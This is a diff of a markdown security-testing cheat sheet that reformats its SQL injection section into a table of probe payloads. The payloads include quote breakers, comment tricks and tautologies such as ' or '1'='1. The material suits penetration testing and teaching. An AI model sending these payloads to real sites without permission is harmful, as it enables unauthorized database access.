@@ -40,36 +40,20 @@
 
 ## SQL Injection
 
-`/?q=1`
-
-`/?q=1'`
-
-`/?q=1"`
-
-`/?q=[1]`
-
-`/?q[]=1`
-
-```/?q=1` ```
-
-`/?q=1\`
-
-`/?q=1/*'*/`
-
-`/?q=1/*!1111'*/`
-
-`/?q=1'||'asd'||'`
-
-`/?q=1' or '1'='1`
-
-`/?q=1 or 1=1`
-
-`/?q='or''='`
-
-```
-username: '--' / "--"
-password: '--' / "--"
-```
+| Payload | Description |
+|----------|-------------|
+|/?q=1'|simple quote|
+|/?q=1"|double quote|
+|/?q=[1]|array value|
+|/?q[]=1|array parameter|
+|/?q=1\`|backquote|
+|/?q=1\\ |escape backslash|
+|/?q=1/\*'\*/|comment simple quote|
+|/?q=1/\*!1111'\*/|comment simple quote|
+|/?q=1'\|\|'asd'\|\|'|string concatenation|
+|/?q=1' or '1'='1|or statement with quotes|
+|/?q=1 or 1=1| or statement without quotes|
+|/?q='or''='|or statement no spaces|
 
 ## CORS
 
